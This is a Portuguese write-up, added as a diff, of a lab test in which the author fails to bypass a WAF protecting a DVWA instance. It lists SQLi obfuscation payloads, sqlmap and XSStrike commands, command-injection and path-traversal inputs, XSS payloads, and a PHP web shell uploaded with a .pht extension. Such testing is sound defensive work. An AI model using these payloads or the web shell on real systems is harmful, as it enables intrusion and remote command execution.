@@ -1,0 +1,133 @@
+Tentativa de Bypass do WAF — Resumo em linguagem simples
+
+O QUE EU TENTEI FAZER
+Depois de provar que o WAF bloqueia SQLi e XSS (as duas vulnerabilidades
+principais), o próximo passo pedido pelo teste era tentar "enganar" esse
+mesmo WAF — ou seja, achar algum jeito de passar o ataque disfarçado, de
+um jeito que a ferramenta de defesa não reconhecesse. Testei em 5 frentes
+diferentes, na ordem abaixo, cada uma com o comando usado logo em seguida.
+
+
+1. TRUQUES MANUAIS DE DISFARCE NO SQLI
+
+Tentei reescrever o mesmo ataque de formas diferentes: letras maiúsculas
+e minúsculas misturadas, tirando espaços, usando comentários no meio do
+código, codificando caracteres de formas alternativas.
+Resultado: bloqueado em todas as tentativas.
+
+    1' OR/**/1=1-- -
+    1' UnIoN SeLeCt 1,2-- -
+    1'OR(1)=(1)-- -
+
+    # Double URL encoding
+    http://192.168.252.2:8443/vulnerabilities/sqli/?id=1%2527+OR+%25271%2527%253D%25271&Submit=Submit
+
+    # HTTP Parameter Pollution
+    http://192.168.252.2:8443/vulnerabilities/sqli/?id=1&id=1%27+OR+%271%27%3D%271&Submit=Submit
+
+    1'||'1'='1
+
+    # Via POST
+    curl -s -o /dev/null -w "%{http_code}\n" -X POST "http://localhost:8443/vulnerabilities/sqli/" \
+      -b 'PHPSESSID=<sessão>; security=low' \
+      --data "id=1' OR '1'='1&Submit=Submit"
+
+    # UTF-8 overlong encoding
+    http://192.168.252.2:8443/vulnerabilities/sqli/?id=1%c0%a7+OR+%c0%a71%c0%a7%3D%c0%a71&Submit=Submit
+
+
+2. FERRAMENTA AUTOMATIZADA (SQLMAP)
+
+Em vez de tentar payload por payload manualmente, usei uma ferramenta
+feita especificamente pra achar falhas de SQL Injection e burlar WAFs.
+Ela testou sozinha mais de 8.000 variações diferentes.
+Resultado: as 8.000+ tentativas foram bloqueadas.
+
+    sudo apt install -y sqlmap
+
+    sqlmap -u "http://localhost:8443/vulnerabilities/sqli/?id=1&Submit=Submit" \
+      --cookie="PHPSESSID=<sessão>; security=low" \
+      --tamper=space2comment,charencode \
+      --batch --level=3 --risk=2
+
+
+3. TROCAR DE TIPO DE ATAQUE
+
+Testei se outros tipos de ataque (comando no sistema, inclusão de
+arquivo, roubo de sessão via link) passariam, já que às vezes um WAF
+protege bem um tipo de ataque e esquece outro.
+Resultado: todos bloqueados também.
+
+    # Command Injection via WAF
+    127.0.0.1 && whoami
+
+    # File Inclusion (path traversal)
+    http://192.168.252.2:8443/vulnerabilities/fi/?page=../../../../../../etc/passwd
+
+    # XSS DOM
+    http://192.168.252.2:8443/vulnerabilities/xss_d/?default=<script>alert('XSS-DOM')</script>
+
+    # XSS Stored (campo Message do guestbook)
+    <details open ontoggle=alert('XSS')>
+
+
+4. FERRAMENTA AUTOMATIZADA PRA XSS (XSSTRIKE)
+
+Igual ao sqlmap, mas focada em testar variações de código malicioso em
+páginas web. Ela encontrou que algumas partes soltas do ataque (uma tag
+HTML sozinha, sem a parte perigosa) passavam despercebidas -- mas assim
+que eu juntava a parte perigosa de novo, era bloqueado.
+Resultado: nenhuma combinação final passou.
+
+    sudo apt install -y python3-pip
+    pip3 install -r requirements.txt --break-system-packages
+
+    python3 xsstrike.py -u "http://192.168.252.2:8443/vulnerabilities/xss_r/?name=test" \
+      --headers "Cookie: PHPSESSID=<sessão>; security=low" \
+      --fuzzer
+
+    # Payloads weaponizados a partir do resultado do fuzzer
+    <details open ontoggle=alert('XSS')>
+    <details open ontoggle=document.body.style.background='red'>
+
+
+5. PESQUISA DE FALHA CONHECIDA PUBLICAMENTE
+
+Pesquisei se esse WAF específico (e essa versão dele) já teve alguma
+falha documentada publicamente por outras pessoas no passado. Achei um
+caso relatado: um jeito de enviar um arquivo malicioso disfarçado de
+imagem, usando uma extensão de arquivo menos comum (.pht em vez de
+.php). Testei essa técnica específica.
+Resultado: bloqueado -- e o motivo apareceu no log: a versão mais
+recente desse WAF (lançada há poucas semanas) já foi corrigida
+exatamente contra essa falha que eu encontrei na pesquisa.
+
+    # Criação do arquivo de teste
+    echo '<?php echo "PHT-BYPASS-TEST"; system($_GET["cmd"] ?? "id"); ?>' > /tmp/shell.pht
+
+    # Tentativa de upload disfarçado
+    curl -s -F "uploaded=@/tmp/shell.pht" -F "Submit=Upload" \
+      "http://localhost:8443/vulnerabilities/upload/" \
+      -b 'PHPSESSID=<sessão>; security=low' \
+      -w "\nHTTP_CODE:%{http_code}\n"
+
+    # Verificação do log para entender o motivo do bloqueio
+    docker compose logs waf --tail 10 | grep -A3 "shell.pht"
+
+
+CONCLUSÃO
+
+Não encontrei nenhuma forma de burlar esse WAF. Tentei de várias
+maneiras diferentes -- na mão, com duas ferramentas automatizadas
+feitas pra isso, trocando o tipo de ataque, e até testando uma falha
+que já foi documentada publicamente contra versões antigas dessa
+mesma ferramenta. Em todos os casos, o WAF bloqueou.
+
+Isso não significa que não vale a pena tentar -- pelo contrário, é
+exatamente esse tipo de teste completo que prova se uma defesa é boa
+de verdade ou só "parece boa". No fim, o resultado (não achar bypass,
+depois de tentar bastante) é uma resposta tão válida quanto achar um.
+Mostra que quem configurou esse WAF (nesse caso, eu mesmo) fez um
+trabalho sólido, e que manter a ferramenta atualizada realmente faz
+diferença -- porque a mesma falha que achei documentada de anos atrás
+já não funciona mais na versão de hoje.
